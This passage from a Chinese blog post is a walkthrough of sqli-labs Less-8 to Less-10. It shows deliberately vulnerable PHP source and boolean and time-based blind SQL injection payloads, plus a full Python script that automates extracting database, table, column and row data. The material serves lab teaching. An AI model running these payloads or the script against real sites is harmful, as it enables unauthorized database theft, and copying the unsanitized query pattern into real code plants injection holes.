Mysql connect parameters.  </span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/sqli-connect.php"</span>);  </span><br><span class="line">error_reporting(<span class="number">0</span>);  </span><br><span class="line"><span class="comment">// take the variables  </span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET\[<span class="string">'id'</span>\]))  </span><br><span class="line">&#123;  </span><br><span class="line">$id=$_GET\[<span class="string">'id'</span>\];  </span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.  </span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);  </span><br><span class="line">fwrite($fp,<span class="string">'ID:'</span>.$id.<span class="string">"\\n"</span>);  </span><br><span class="line">fclose($fp);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// connectivity   </span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;  </span><br><span class="line">$result=mysqli_query($con1, $sql);  </span><br><span class="line">$row = mysqli\_fetch\_array($result, MYSQLI_BOTH);  </span><br><span class="line">  </span><br><span class="line"> <span class="keyword">if</span>($row)  </span><br><span class="line"> &#123;  </span><br><span class="line"> <span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;   </span><br><span class="line"> <span class="keyword">echo</span> <span class="string">'You are in...........'</span>;  </span><br><span class="line"> <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;  </span><br><span class="line"> <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line"> &#125;  </span><br><span class="line"> <span class="keyword">else</span>   </span><br><span class="line"> &#123;  </span><br><span class="line">    </span><br><span class="line"> <span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;  </span><br><span class="line"> <span class="comment">//echo 'You are in...........';  </span></span><br><span class="line"> <span class="comment">//print\_r(mysqli\_error($con1));  </span></span><br><span class="line"> <span class="comment">//echo "You have an error in your SQL syntax";  </span></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;&lt;/font&gt;"</span>;   </span><br><span class="line"> <span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size= 3&gt;'</span>;   </span><br><span class="line">    </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"> <span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value"</span>;&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>?id=1</strong></p>
+<a rel=Sqli-labs-GET Part 1-10 href="/2019/08/10/Sqli-labs-GET%20Part%201-10/8.1.jpg" title="" data-fancybox="images"><img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/8.1.jpg"></a>
+
+<p>尝试单引号却什么都没返回，看了下源码就是这样处理的，点题盲注，盲注主要分为bool型和时间性，通常涉及到这几个函数:</p>
+<h2 id="盲注常用函数-amp-amp-固有公式："><a href="#盲注常用函数-amp-amp-固有公式：" class="headerlink" title="盲注常用函数&amp;&amp;固有公式："></a><a href="#盲注常用函数-amp-amp-固有公式：" title="盲注常用函数&amp;&amp;固有公式："></a>盲注常用函数&amp;&amp;固有公式：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">length(str)：返回字符串str的长度  </span><br><span class="line">substr(str,pos,len)：将str从pos位置开始截取len长度的字符返回，需要注意的是这里pos的是从1开始的  </span><br><span class="line">mid(str,pos,len)：和substr()类似  </span><br><span class="line">ascii(str)：返回字符串str最左边的acsii码（即首字母的acsii码）  </span><br><span class="line">ord()：同上，返回acsii码  </span><br><span class="line">left(str,len)：对字符串str左截取len长度  </span><br><span class="line">right(str,len)：对字符串str右截取len长度  </span><br><span class="line"><span class="keyword">if</span>(a,b,c)：条件判断，如果a为<span class="literal">true</span>，返回b，否则返回c  </span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">盲注有个固定式：and ascii(substr(A,1,1))&gt;B，或者and <span class="keyword">if</span>(ascii(substr(A,1,1))&gt;B,1,0)，这里的A通常是一个select语句，B则是字符或数字的ascii码，他们的中心思想都是通过substr等截取函数以二分法的形式查询逐个匹配想要的信息，这个过程通常都很耗时，所以建议直接写个盲注脚本来跑</span><br></pre></td></tr></table></figure>
+
+<p>下面是盲注匹配的一个例子，我们来匹配数据库名，在之前的实验中已知数据库名是security，下面的sql语句是用来匹配数据库名的第一个字母<br><strong>?id=1’ and ascii(substr((select database()),1,1))&gt;114–+</strong></p>
+<a rel=Sqli-labs-GET Part 1-10 href="/2019/08/10/Sqli-labs-GET%20Part%201-10/8.2.jpg" title="" data-fancybox="images"><img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/8.2.jpg"></a>
+
+<p>字母s的ascii码是115，所以他大于114，结果为true，页面显示正常，依次类推即可</p>
+<p>也可以用脚本来跑，dalao那拿来的</p>
+<h2 id="盲注脚本"><a href="#盲注脚本" class="headerlink" title="盲注脚本"></a><a href="#盲注脚本" title="盲注脚本"></a>盲注脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"> </span><br><span class="line"><span class="string">""" </span></span><br><span class="line"><span class="string">@version:  </span></span><br><span class="line"><span class="string">@author: giantbranch </span></span><br><span class="line"><span class="string">@file: code_inject.py </span></span><br><span class="line"><span class="string">@time: 2016/5/1  </span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">success_str = <span class="string">"You are in"</span></span><br><span class="line">getTable = <span class="string">"users"</span></span><br><span class="line"> </span><br><span class="line">index = <span class="string">"0"</span></span><br><span class="line">url = <span class="string">"http://localhost/sqli-labs/Less-8/?id=1"</span></span><br><span class="line">database = <span class="string">"database()"</span></span><br><span class="line">selectDB = <span class="string">"select database()"</span></span><br><span class="line">selectTable = <span class="string">"select table_name from information_schema.tables where table_schema='%s' limit %d,1"</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">asciiPayload = <span class="string">"' and ascii(substr((%s),%d,1))&gt;=%d #"</span></span><br><span class="line">lengthPayload = <span class="string">"' and length(%s)&gt;=%d #"</span></span><br><span class="line">selectTableCountPayload = <span class="string">"'and (select count(table_name) from information_schema.tables where table_schema='%s')&gt;=%d #"</span></span><br><span class="line"> </span><br><span class="line">selectTableNameLengthPayloadfront = <span class="string">"'and (select length(table_name) from information_schema.tables where table_schema='%s' limit "</span></span><br><span class="line">selectTableNameLengthPayloadbehind = <span class="string">",1)&gt;=%d #"</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># 发送请求，根据页面的返回的判断长度的猜测结果</span></span><br><span class="line"><span class="comment"># string:猜测的字符串 payload:使用的payload  length：猜测的长度</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getLengthResult</span><span class="params">(payload, string, length)</span>:</span></span><br><span class="line">    finalUrl = url + urllib.quote(payload % (string, length))</span><br><span class="line">    res = urllib2.urlopen(finalUrl)</span><br><span class="line">    <span class="keyword">if</span> success_str <span class="keyword">in</span> res.read():</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 发送请求，根据页面的返回的判断猜测的字符是否正确</span></span><br><span class="line"><span class="comment"># payload:使用的payload    string:猜测的字符串   pos：猜测字符串的位置    ascii：猜测的ascii</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getResult</span><span class="params">(payload, string, pos, ascii)</span>:</span></span><br><span class="line">    finalUrl = url + urllib.quote(payload % (string, pos, ascii))</span><br><span class="line">    res = urllib2.urlopen(finalUrl)</span><br><span class="line">    <span class="keyword">if</span> success_str <span class="keyword">in</span> res.read():</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 注入</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inject</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 猜数据库长度</span></span><br><span class="line">    lengthOfDBName = getLengthOfString(lengthPayload, database)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"length of DBname: "</span> + str(lengthOfDBName)</span><br><span class="line">    <span class="comment"># 获取数据库名称</span></span><br><span class="line">    DBname = getName(asciiPayload, selectDB, lengthOfDBName)</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"current database:"</span> + DBname</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 获取数据库中的表的个数</span></span><br><span class="line">    <span class="comment"># print selectTableCountPayload</span></span><br><span class="line">    tableCount = getLengthOfString(selectTableCountPayload, DBname)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"count of talbe:"</span> + str(tableCount)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 获取数据库中的表</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,tableCount):</span><br><span class="line">        <span class="comment"># 第几个表</span></span><br><span class="line">        num = str(i)</span><br><span class="line">        <span class="comment"># 获取当前这个表的长度</span></span><br><span class="line">        selectTableNameLengthPayload = selectTableNameLengthPayloadfront + num + selectTableNameLengthPayloadbehind</span><br><span class="line">        tableNameLength = getLengthOfString(selectTableNameLengthPayload, DBname)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"current table length:"</span> + str(tableNameLength)</span><br><span class="line">        <span class="comment"># 获取当前这个表的名字</span></span><br><span class="line">        selectTableName = selectTable%(DBname, i)</span><br><span class="line">        tableName = getName(asciiPayload, selectTableName ,tableNameLength)</span><br><span class="line">        <span class="keyword">print</span> tableName</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    selectColumnCountPayload = <span class="string">"'and (select count(column_name) from information_schema.columns where table_schema='"</span>+ DBname +<span class="string">"' and table_name='%s')&gt;=%d #"</span></span><br><span class="line">    <span class="comment"># print selectColumnCountPayload</span></span><br><span class="line">    <span class="comment"># 获取指定表的列的数量</span></span><br><span class="line">    columnCount = getLengthOfString(selectColumnCountPayload, getTable)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"table:"</span> + getTable + <span class="string">" --count of column:"</span> + str(columnCount)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 获取该表有多少行数据</span></span><br><span class="line">    dataCountPayload = <span class="string">"'and (select count(*) from %s)&gt;=%d #"</span></span><br><span class="line">    dataCount = getLengthOfString(dataCountPayload, getTable)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"table:"</span> + getTable + <span class="string">" --count of data: "</span> + str(dataCount)</span><br><span class="line"> </span><br><span class="line">    data = []</span><br><span class="line">    <span class="comment"># 获取指定表中的列</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,columnCount):</span><br><span class="line">        <span class="comment"># 获取该列名字长度</span></span><br><span class="line">        selectColumnNameLengthPayload = <span class="string">"'and (select length(column_name) from information_schema.columns where table_schema='"</span>+ DBname +<span class="string">"' and table_name='%s' limit "</span>+ str(i) +<span class="string">",1)&gt;=%d #"</span></span><br><span class="line">        <span class="comment"># print selectColumnNameLengthPayload</span></span><br><span class="line">        columnNameLength = getLengthOfString(selectColumnNameLengthPayload, getTable)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"current column length:"</span> + str(columnNameLength)</span><br><span class="line">        <span class="comment"># 获取该列的名字</span></span><br><span class="line">        selectColumn = <span class="string">"select column_name from information_schema.columns where table_schema='"</span>+ DBname +<span class="string">"' and table_name='%s' limit %d,1"</span></span><br><span class="line">        selectColumnName = selectColumn%(getTable, i)</span><br><span class="line">        <span class="comment"># print selectColumnName</span></span><br><span class="line">        columnName = getName(asciiPayload, selectColumnName ,columnNameLength)</span><br><span class="line">        <span class="keyword">print</span> columnName</span><br><span class="line"> </span><br><span class="line">        tmpData = []</span><br><span class="line">        tmpData.append(columnName)</span><br><span class="line">        <span class="comment"># 获取该表的数据</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">0</span>,dataCount):</span><br><span class="line">            columnDataLengthPayload = <span class="string">"'and (select length("</span>+ columnName +<span class="string">") from %s limit "</span> + str(j) + <span class="string">",1)&gt;=%d #"</span></span><br><span class="line">            <span class="comment"># print columnDataLengthPayload</span></span><br><span class="line">            columnDataLength = getLengthOfString(columnDataLengthPayload, getTable)</span><br><span class="line">            <span class="comment"># print columnDataLength</span></span><br><span class="line">            selectData = <span class="string">"select "</span> + columnName + <span class="string">" from users limit "</span> + str(j) + <span class="string">",1"</span></span><br><span class="line">            columnData = getName(asciiPayload, selectData, columnDataLength)</span><br><span class="line">            <span class="comment"># print columnData</span></span><br><span class="line">            tmpData.append(columnData)</span><br><span class="line">     </span><br><span class="line">        data.append(tmpData)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># print data    </span></span><br><span class="line">    <span class="comment"># 格式化输出数据</span></span><br><span class="line">    <span class="comment"># 输出列名</span></span><br><span class="line">    tmp = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,len(data)):</span><br><span class="line">        tmp += data[i][<span class="number">0</span>] + <span class="string">"   "</span></span><br><span class="line">    <span class="keyword">print</span> tmp</span><br><span class="line">    <span class="comment"># 输出具体数据</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">1</span>,dataCount+<span class="number">1</span>):</span><br><span class="line">        tmp = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,len(data)):</span><br><span class="line">            tmp += data[i][j] + <span class="string">"   "</span></span><br><span class="line">        <span class="keyword">print</span> tmp</span><br><span class="line">     </span><br><span class="line"><span class="comment"># 获取字符串的长度          </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getLengthOfString</span><span class="params">(payload, string)</span>:</span></span><br><span class="line">    <span class="comment"># 猜长度</span></span><br><span class="line">    lengthLeft = <span class="number">0</span></span><br><span class="line">    lengthRigth = <span class="number">0</span></span><br><span class="line">    guess = <span class="number">10</span></span><br><span class="line">    <span class="comment"># 确定长度上限，每次增加5</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="comment"># 如果长度大于guess</span></span><br><span class="line">        <span class="keyword">if</span> getLengthResult(payload, string, guess) == <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># 猜测值增加5</span></span><br><span class="line">            guess = guess + <span class="number">5</span>   </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            lengthRigth = guess</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># print "lengthRigth: " + str(lengthRigth)</span></span><br><span class="line">    <span class="comment"># 二分法查长度</span></span><br><span class="line">    mid = (lengthLeft + lengthRigth) / <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> lengthLeft &lt; lengthRigth - <span class="number">1</span>:</span><br><span class="line">        <span class="comment"># 如果长度大于等于mid </span></span><br><span class="line">        <span class="keyword">if</span> getLengthResult(payload, string, mid) == <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># 更新长度的左边界为mid</span></span><br><span class="line">            lengthLeft = mid</span><br><span class="line">        <span class="keyword">else</span>: </span><br><span class="line">        <span class="comment"># 否则就是长度小于mid</span></span><br><span class="line">            <span class="comment"># 更新长度的右边界为mid</span></span><br><span class="line">            lengthRigth = mid</span><br><span class="line">        <span class="comment"># 更新中值</span></span><br><span class="line">        mid = (lengthLeft + lengthRigth) / <span class="number">2</span>        </span><br><span class="line">        <span class="comment"># print lengthLeft, lengthRigth</span></span><br><span class="line">    <span class="comment"># 因为lengthLeft当长度大于等于mid时更新为mid，而lengthRigth是当长度小于mid时更新为mid</span></span><br><span class="line">    <span class="comment"># 所以长度区间：大于等于 lengthLeft，小于lengthRigth</span></span><br><span class="line">    <span class="comment"># 而循环条件是 lengthLeft &lt; lengthRigth - 1，退出循环，lengthLeft就是所求长度</span></span><br><span class="line">    <span class="comment"># 如循环到最后一步 lengthLeft = 8， lengthRigth = 9时，循环退出，区间为8&lt;=length&lt;9,length就肯定等于8</span></span><br><span class="line">    <span class="keyword">return</span> lengthLeft</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 获取名称</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getName</span><span class="params">(payload, string, lengthOfString)</span>:</span></span><br><span class="line">    <span class="comment"># 32是空格，是第一个可显示的字符，127是delete，最后一个字符</span></span><br><span class="line">    tmp = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,lengthOfString+<span class="number">1</span>):</span><br><span class="line">        left = <span class="number">32</span> </span><br><span class="line">        right = <span class="number">127</span></span><br><span class="line">        mid = (left + right) / <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> left &lt; right - <span class="number">1</span>:</span><br><span class="line">            <span class="comment"># 如果该字符串的第i个字符的ascii码大于等于mid</span></span><br><span class="line">            <span class="keyword">if</span> getResult(payload, string, i, mid) == <span class="literal">True</span>:</span><br><span class="line">                <span class="comment"># 则更新左边界</span></span><br><span class="line">                left = mid</span><br><span class="line">                mid = (left + right) / <span class="number">2</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 否则该字符串的第i个字符的ascii码小于mid</span></span><br><span class="line">                <span class="comment"># 则更新右边界</span></span><br><span class="line">                right = mid</span><br><span class="line">            <span class="comment"># 更新中值</span></span><br><span class="line">            mid = (left + right) / <span class="number">2</span></span><br><span class="line">        tmp += chr(left)</span><br><span class="line">        <span class="comment"># print tmp</span></span><br><span class="line">    <span class="keyword">return</span> tmp  </span><br><span class="line">         </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    inject()</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
+
+<h1 id="Less-9基于时间的GET单引号盲注"><a href="#Less-9基于时间的GET单引号盲注" class="headerlink" title="Less-9基于时间的GET单引号盲注"></a><a href="#Less-9基于时间的GET单引号盲注" title="Less-9基于时间的GET单引号盲注"></a>Less-9基于时间的GET单引号盲注</h1><h2 id="Less-9源码："><a href="#Less-9源码：" class="headerlink" title="Less-9源码："></a><a href="#Less-9源码：" title="Less-9源码："></a>Less-9源码：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="comment">//including the Mysql connect parameters.  </span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/sqli-connect.php"</span>);  </span><br><span class="line">error_reporting(<span class="number">0</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// take the variables  </span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))  </span><br><span class="line">&#123;  </span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];  </span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.  </span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);  </span><br><span class="line">fwrite($fp,<span class="string">'ID:'</span>.$id.<span class="string">"\\n"</span>);  </span><br><span class="line">fclose($fp);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// connectivity   </span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;  </span><br><span class="line">$result=mysqli_query($con1, $sql);  </span><br><span class="line">$row = mysqli_fetch_array($result, MYSQLI_BOTH);  </span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>($row)  </span><br><span class="line"> &#123;  </span><br><span class="line"> <span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;   </span><br><span class="line"> <span class="keyword">echo</span> <span class="string">'You are in...........'</span>;  </span><br><span class="line"> <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;  </span><br><span class="line"> <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line"> &#125;  </span><br><span class="line"> <span class="keyword">else</span>   </span><br><span class="line"> &#123;  </span><br><span class="line">    </span><br><span class="line"> <span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;  </span><br><span class="line"> <span class="keyword">echo</span> <span class="string">'You are in...........'</span>;  </span><br><span class="line"> <span class="comment">//print_r(mysqli_error($con1));  </span></span><br><span class="line"> <span class="comment">//echo "You have an error in your SQL syntax";  </span></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;&lt;/font&gt;"</span>;   </span><br><span class="line"> <span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size= 3&gt;'</span>;   </span><br><span class="line">    </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"> <span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value"</span>;&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>输入?id=1后仍与上题无异</p>
+<p>时间型盲注和bool型盲注应用场景不同之处在报错的返回上，从less-8我们知道，输入合法时他会返回正常页面“You are in……”，而非法输入时他没有返回任何东西，于是，我们可以根据这个特点跑盲注，通过他不同的返回页面来判断我们匹配的字符是否正确，而在less-9中合法输入与非合法输入它都返回一个页面，就是“You are in…..”</p>
+<p>这样，我们就不能根据他页面的返回内容来判断匹配结果了，因此我们需要用延时函数sleep()对两种输入进行区分，可以构造如下语句：<br><strong>?id=1’ and if(ascii(substr(database(),1,1))&gt;115,0,sleep(5))–+</strong></p>
+<a rel=Sqli-labs-GET Part 1-10 href="/2019/08/10/Sqli-labs-GET%20Part%201-10/9.1.jpg" title="" data-fancybox="images"><img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/9.1.jpg"></a>
+
+<p>这里的意思是，如果数据库名首字母的ascii码大于115，那么执行sleep(5)，延时5秒，此时标签栏会变成缓冲，于是，我们就可以判断匹配的结果了，盲注脚本与less-8类似，只需要加入sleep函数即可</p>
+<h1 id="Less-10-基于时间的双引号盲注"><a href="#Less-10-基于时间的双引号盲注" class="headerlink" title="Less-10 基于时间的双引号盲注"></a><a href="#Less-10-基于时间的双引号盲注" title="Less-10 基于时间的双引号盲注"></a>Less-10 基于时间的双引号盲注</h1><p>把第九题的单引号改为双引号即可<br><strong>?id=1” and if(ascii(substr(database(),1,1))&gt;115,0,sleep(5))–+</strong></p>
+
+        </div>
+        
+<blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2019-11-14T12:22:38.478Z" itemprop="dateUpdated">2019-11-14 20:22:38</time>
+</span><br>
+
+
+        
+        转载注明出处，原文地址：<a href="/2019/08/10/Sqli-labs-GET Part 1-10/" target="_blank" rel="external">https://ddstick.github.io/2019/08/10/Sqli-labs-GET Part 1-10/</a>
+        
+    </div>
+    <footer>
+        <a href="https://ddstick.github.io">
+            <img src="/img/dd.jpg" alt="DD">
+            DD
+        </a>
+    </footer>
+</blockquote>
+
+        
+            <div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+            
+        
+        <div class="post-footer">
+            
+            <div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      
+      <li>
